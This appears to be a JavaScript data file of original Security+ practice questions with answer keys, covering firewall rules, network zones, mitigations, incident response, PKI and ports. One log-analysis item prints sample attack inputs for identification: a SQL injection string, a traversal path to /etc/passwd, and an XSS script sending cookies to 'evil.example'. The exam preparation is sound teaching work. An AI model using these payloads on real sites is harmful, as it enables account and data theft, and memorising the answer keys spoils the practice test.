// Security+ (SY0-701) performance-based questions for the mock exam and Library practice (3.3.0).
// Original scenarios in the formats CompTIA describes publicly: rule tables, placement, matching,
// log analysis and ordering. Not CompTIA's questions.
// Shape: {id, dom, title, brief, log?:[lines], zones?:[names], cols:[{name, options:[...]}],
//   rows:[{label, ans:[option index per column], opts?:[per-column override options]}], why}
// Each row/column cell is one point. Options are shown in the order written, so the right answer
// is never always first.
window.PBQ_SEC=[
{id:"fw-dmz",dom:"4 Operations",title:"Build the DMZ firewall rules",
 brief:"A web server (10.0.2.10) and a DNS server (10.0.2.53) sit in the screened subnet. The public must reach the website securely and use the DNS server. Admins on 10.0.1.0/24 manage the web server remotely over an encrypted session. Telnet must never reach the web server. Everything else is blocked. Pick the port and action for each rule, top to bottom.",
 cols:[{name:"Port",options:["22","23","53","80","443","3389","Any"]},{name:"Action",options:["Allow","Deny"]}],
 rows:[
  {label:"1. Any → 10.0.2.10 (public website)",ans:[4,0]},
  {label:"2. 10.0.1.0/24 → 10.0.2.10 (admin access)",ans:[0,0]},
  {label:"3. Any → 10.0.2.53 (DNS queries)",ans:[2,0]},
  {label:"4. Any → 10.0.2.10 (Telnet)",ans:[1,1]},
  {label:"5. Any → Any (everything else)",ans:[6,1]}],
 why:"HTTPS is 443, SSH is 22 and DNS is 53. Telnet (23) sends everything in plain text, so it's denied. The last rule is the deny-all that catches anything not allowed above it."},

{id:"place-zones",dom:"3 Architecture",title:"Place each system in the right zone",
 brief:"A company is redesigning its network into three zones. Put each system where it belongs.",
 zones:["Screened subnet (DMZ)","Internal network","Management network"],
 cols:[{name:"Zone",options:["Screened subnet (DMZ)","Internal network","Management network"]}],
 rows:[
  {label:"Public website server",ans:[0]},
  {label:"HR file server",ans:[1]},
  {label:"Mail relay that accepts email from the internet",ans:[0]},
  {label:"Jump server admins use to reach other servers",ans:[2]},
  {label:"Customer database behind the website",ans:[1]},
  {label:"Domain controller",ans:[1]}],
 why:"Anything the internet must reach directly goes in the DMZ. Sensitive data stores and identity servers stay internal, reached only through the DMZ systems that need them. Admin tools like a jump server get their own management network."},

{id:"attack-fix",dom:"2 Threats & vulns",title:"Match each attack to its best mitigation",
 brief:"For each attack, pick the control that most directly stops it.",
 cols:[{name:"Mitigation",options:["Data loss prevention","Input validation and parameterized queries","Account lockout after failed attempts","Multifactor authentication","Output encoding","Offline, immutable backups","VPN on untrusted networks","Disabling the guest account"]}],
 rows:[
  {label:"SQL injection in a login form",ans:[1]},
  {label:"Thousands of password guesses against one account",ans:[2]},
  {label:"Attackers reuse passwords leaked from another site",ans:[3]},
  {label:"A comment field runs a script in other users' browsers",ans:[4]},
  {label:"Ransomware encrypts the file servers",ans:[5]},
  {label:"On-path attack on hotel Wi-Fi",ans:[6]}],
 why:"Parameterized queries stop SQL injection. Lockout stops guessing against one account. MFA makes leaked passwords useless on their own. Output encoding stops stored XSS. Offline backups let you recover from ransomware without paying. A VPN encrypts traffic on networks you don't control."},

{id:"log-hunt",dom:"4 Operations",title:"Identify the attack in each log entry",
 brief:"A SOC analyst pulled these entries from the web and authentication logs. Name the attack behind each one.",
 log:[
  "A  GET /login?user=admin'%20OR%201=1--&pass=x  200",
  "B  09:14:02 FAILED login user=asmith  src=203.0.113.40",
  "B  09:14:02 FAILED login user=bjones  src=203.0.113.40",
  "B  09:14:03 FAILED login user=cdavis  src=203.0.113.40   (same password tried for 400 users)",
  "C  GET /download?file=../../../../etc/passwd  200",
  "D  GET /search?q=<script>document.location='https://evil.example/?c='+document.cookie</script>",
  "E  10:02:00-10:09:59 FAILED login user=jlee  src=198.51.100.7  x 2,000"],
 cols:[{name:"Attack",options:["Brute force","Cross-site scripting","Directory traversal","Password spraying","SQL injection","Buffer overflow"]}],
 rows:[{label:"Entry A",ans:[4]},{label:"Entry B",ans:[3]},{label:"Entry C",ans:[2]},{label:"Entry D",ans:[1]},{label:"Entry E",ans:[0]}],
 why:"' OR 1=1-- rewrites a database query (SQL injection). One password tried across many accounts is spraying; thousands of guesses at one account is brute force. ../ climbs out of the web folder (directory traversal). A script stealing cookies in a URL is XSS."},

{id:"ir-order",dom:"4 Operations",title:"Put the incident response steps in order",
 brief:"Arrange the incident response process from first to last.",
 cols:[{name:"Order",options:["1st","2nd","3rd","4th","5th","6th","7th"]}],
 rows:[
  {label:"Eradication",ans:[4]},{label:"Preparation",ans:[0]},{label:"Lessons learned",ans:[6]},{label:"Containment",ans:[3]},
  {label:"Detection",ans:[1]},{label:"Recovery",ans:[5]},{label:"Analysis",ans:[2]}],
 why:"Preparation, detection, analysis, containment, eradication, recovery, lessons learned. Contain before you clean up, and clean up before you restore."},

{id:"volatility",dom:"4 Operations",title:"Order of volatility",
 brief:"A responder is collecting evidence from a live, compromised server. Put the sources in the order they should be collected.",
 cols:[{name:"Collect",options:["1st","2nd","3rd","4th","5th"]}],
 rows:[{label:"Hard drive",ans:[3]},{label:"CPU cache and registers",ans:[0]},{label:"Backup tapes",ans:[4]},{label:"RAM",ans:[1]},{label:"Swap / page file",ans:[2]}],
 why:"Collect what disappears soonest first: registers and cache, then memory, then swap, then disk, then archived media."},

{id:"controls",dom:"1 General concepts",title:"Classify each security control",
 brief:"Pick the category and the type for each control.",
 cols:[{name:"Category",options:["Technical","Managerial","Operational","Physical"]},{name:"Type",options:["Preventive","Detective","Corrective","Deterrent","Compensating","Directive"]}],
 rows:[
  {label:"Firewall rule that blocks inbound RDP",ans:[0,0]},
  {label:"IDS alert on a port scan",ans:[0,1]},
  {label:"Antivirus quarantines an infected file",ans:[0,2]},
  {label:"\"Premises under video surveillance\" sign",ans:[3,3]},
  {label:"Acceptable use policy employees must follow",ans:[1,5]},
  {label:"Bollards in front of the entrance",ans:[3,0]},
  {label:"Segmenting a legacy system that can't be patched",ans:[0,4]}],
 why:"Technical controls are enforced by systems; physical ones you can touch; managerial ones are policies and plans. A sign deters, a policy directs, and isolating what you can't patch compensates for the missing fix."},

{id:"wifi",dom:"3 Architecture",title:"Secure the office wireless",
 brief:"A small office wants employees to sign in to Wi-Fi with their own directory accounts and give visitors internet-only access. Choose the setting for each item.",
 cols:[{name:"Setting",options:[]}],
 rows:[
  {label:"Employee network security mode",ans:[3],opts:[["WEP","WPA2-Personal","WPA3-Personal","WPA3-Enterprise","Open"]]},
  {label:"How employees authenticate",ans:[1],opts:[["One shared passphrase","802.1X with a RADIUS server","MAC address filtering","WPS PIN"]]},
  {label:"Where the guest network goes",ans:[2],opts:[["Same VLAN as employees","Management VLAN","Separate guest VLAN with internet only"]]},
  {label:"Guest network security",ans:[1],opts:[["Open with no encryption","WPA3-Personal with a passphrase","WEP"]]},
  {label:"Feature to turn off",ans:[0],opts:[["WPS","802.1X","The firewall","DHCP"]]}],
 why:"Enterprise mode uses 802.1X and RADIUS so each person signs in with their own account. Guests get their own VLAN and a passphrase. WPS is easy to crack, so turn it off."},

{id:"pki",dom:"1 General concepts",title:"Match the PKI term to what it does",
 brief:"Match each term to its description.",
 cols:[{name:"Description",options:["Checks one certificate's status in real time","Covers every subdomain of one domain","A downloadable list of revoked certificates","Sent to a CA to request a certificate","Signed by itself; not trusted by browsers by default","The web server attaches a fresh status response to the handshake","Stores a copy of private keys with a trusted third party"]}],
 rows:[
  {label:"CRL",ans:[2]},{label:"OCSP",ans:[0]},{label:"CSR",ans:[3]},{label:"Wildcard certificate",ans:[1]},
  {label:"Self-signed certificate",ans:[4]},{label:"OCSP stapling",ans:[5]},{label:"Key escrow",ans:[6]}],
 why:"CRL is the list; OCSP asks about one certificate; stapling lets the server deliver that answer itself. A CSR asks a CA for a certificate. Key escrow keeps a copy of keys with a trusted party."},

{id:"ports",dom:"3 Architecture",title:"Pick the port for each secure service",
 brief:"A firewall change request lists these services. Choose the default port for each.",
 cols:[{name:"Port",options:["22","53","161","389","443","514","636","993","3389"]}],
 rows:[
  {label:"Encrypted web traffic",ans:[4]},{label:"Encrypted remote command line",ans:[0]},{label:"Directory lookups over TLS (LDAPS)",ans:[6]},
  {label:"Windows Remote Desktop",ans:[8]},{label:"Syslog",ans:[5]},{label:"Encrypted email retrieval (IMAPS)",ans:[7]},{label:"Name resolution",ans:[1]},{label:"SNMP polling",ans:[2]}],
 why:"HTTPS 443, SSH 22, LDAPS 636 (plain LDAP is 389), RDP 3389, syslog 514, IMAPS 993, DNS 53, SNMP 161."},

{id:"risk",dom:"5 Program mgmt",title:"Choose the risk response",
 brief:"For each decision, pick the risk response it represents.",
 cols:[{name:"Response",options:["Accept","Avoid","Mitigate","Transfer"]}],
 rows:[
  {label:"Buying a cybersecurity insurance policy",ans:[3]},
  {label:"Shutting down an old service instead of securing it",ans:[1]},
  {label:"Patching servers and adding MFA",ans:[2]},
  {label:"Leadership documents a low risk and takes no action",ans:[0]},
  {label:"Moving card payments to a processor that takes on liability by contract",ans:[3]}],
 why:"Insurance and contracts shift the impact to someone else (transfer). Stopping the activity removes the risk (avoid). Controls reduce it (mitigate). A documented decision to live with it is acceptance."},

{id:"data-roles",dom:"5 Program mgmt",title:"Match each data role",
 brief:"A company is mapping who is responsible for customer data. Match each description to its role.",
 cols:[{name:"Role",options:["Data subject","Data owner","Data controller","Data processor","Data custodian"]}],
 rows:[
  {label:"The person the data is about",ans:[0]},
  {label:"Decides why and how personal data is processed",ans:[2]},
  {label:"A payroll vendor handling data on the company's behalf",ans:[3]},
  {label:"Senior leader accountable for the data set",ans:[1]},
  {label:"IT staff who back it up and apply the access controls",ans:[4]}],
 why:"The subject is who the data describes. The controller decides the purpose; the processor works for the controller. The owner is accountable; the custodian does the day-to-day care."}
];
